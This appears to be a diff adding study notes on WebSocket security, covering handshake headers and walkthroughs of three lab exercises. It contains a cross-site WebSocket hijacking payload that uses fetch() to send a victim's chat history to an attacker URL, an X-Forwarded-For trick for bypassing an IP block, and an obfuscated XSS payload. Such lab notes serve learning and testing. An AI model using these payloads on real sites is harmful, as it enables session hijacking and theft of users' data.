@@ -1,0 +1,61 @@
+Web socket:
+- Bi-directional, full duplex communications protocol
+- Used for streaming data and other asynchronous traffic
+- Useful in situations where low-latency or server-initiated messages are required
+- var ws = new WebSocket("wss://normal-website.com/chat");
+    + wss protocol established a websocket over an encrypted TLS connection
+    + ws protocol uses an unencrypted connection
+
+Notes:
+- The 'Connection: Upgrade' headers in the request and response indicate that this is a WebSocket handshake.
+- The 'Sec-WebSocket-Version: 13' request header specifies the WebSocket protocol version that the client wishes to use.
+- The 'Sec-WebSocket-Key' request header contains a Base64-encoded random value, which should be randomly generated in each handshake request.
+- The Sec-WebSocket-Accept response header contains a hash of the value submitted in the Sec-WebSocket-Key request header, concatenated with a specific string defined in the protocol specification. This is done to prevent misleading responses resulting from misconfigured servers or caching proxies.
+
+Example:
+    + Client send: ws.send("Peter Wiener");
+    + Message response can contain any content or data format
+        {"user":"Hal Pline","content":"I wanted to be a Playstation growing up, not a device to answer your inane questions"}
+
+WebSockets security vulnerabilities:
+- Manipulating WebSocket messages to exploit vulnerabilities:
+    + Sometimes, only FE validate input, so we send directly to BE
+- Manipulating the WebSocket handshake to exploit vulnerabilities:
+    + Misplaced trust in HTTP headers to perform security decisions (Example: X-Forwarded-For)
+    + Flaws in session handling mechanisms, since the session context in which WebSocket messages are processed is generally determined by the session context of the handshake message.
+    + Attack surface introduced by custom HTTP headers used by the application.
+- Using cross-site WebSockets to exploit vulnerabilities
+    + Some WebSocket security vuln arise when attacker make a cross-domain connection from attacker's website.
+    + Cross-site WebSocket hijacking(CSWSH) known as WebSocket hijacking, involves CSRF
+    + Enable attacker: perform unauthorized actions as victim user, retrieve sensitive data that usercan access
+    + Process: 
+        + Analysis handshake (only use cookie to validate session)
+        + Redirect victim to attacker's website
+        + Perform unauthorized actions
+
+
+01_Manipulating_WebSocket_messages_to_exploit_vulnerabilities
+- This is vuln in websocket function
+    + Only validate input in FE
+    + In backend not validate, lead to a simple XSS
+- Process of exploit:
+    Connect to Websocket -> Send "READY" -> Send XSS Payload -> Goto web page to receive the XSS
+
+02_Cross_site_WebSocket_hijacking
+- We know that, if sending message READY, server will return back all old message
+- So process to exploit is:
+    Create new connection to WebSocket -> Send READY message -> Retrieve all messages that websocket return to attacker's server
+- Payload:
+    <script>
+        var ws = new WebSocket('{web_socket_url}/chat');
+        ws.onopen = function() {{ ws.send("READY"); }};
+        ws.onmessage = function(event) {{
+            fetch('{exploit_url}/?message='+event.data);
+        }};
+    </script>
+
+03_Manipulating_the_WebSocket_handshake_to_exploit_vulnerabilities
+- In this lab, if we input something suspicious, it will block the IP
+- So we can use 'X-Forward-For' header to bypass the IP blacklist
+- Try obfuscated payload until bypass it
+    <img src=1 OnErRor=alert`1`>
